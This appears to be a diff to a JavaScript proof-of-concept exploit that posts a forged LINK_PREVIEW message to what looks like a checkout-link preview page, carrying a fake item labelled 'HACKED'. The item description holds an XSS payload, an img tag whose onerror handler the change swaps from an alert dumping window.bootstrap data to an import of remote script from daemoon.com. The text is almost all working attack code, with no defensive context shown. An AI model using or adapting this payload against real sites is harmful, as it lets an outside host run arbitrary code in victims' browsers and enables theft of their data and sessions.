@@ -15,7 +15,7 @@ setTimeout(function() {
                   name:'LINK_PREVIEW',
                   data:{type:'INITIALIZE',uuid:'x',data:{
                       checkout_link:{id:'l',link_type:'ITEM_LINK',checkout_link_data:{name:'P',link_type:'ITEM_LINK',order_details:{line_items:[{item_id:'i',quantity:{quantity:1}}]}}},
-                      related_objects:[{type:'ITEM',id:'i',item_data:{name:'HACKED',description_html:'',description:'<img src=x onerror=alert(JSON.stringify(Object.values(window.bootstrap)));>',variations:[{type:'ITEM_VARIATION',id:'v',item_variation_data:{item_id:'i',name:'D',pricing_type:'FIXED_PRICING',price_money:{amount:100,currency:'USD'}}}]}}],
+                      related_objects:[{type:'ITEM',id:'i',item_data:{name:'HACKED',description_html:'',description:'<img src=x onerror=import("https://daemoon.com/index.js")>',variations:[{type:'ITEM_VARIATION',id:'v',item_variation_data:{item_id:'i',name:'D',pricing_type:'FIXED_PRICING',price_money:{amount:100,currency:'USD'}}}]}}],
                       settings:{checkout_title:'HACKED'}
                   }}
               },'*');
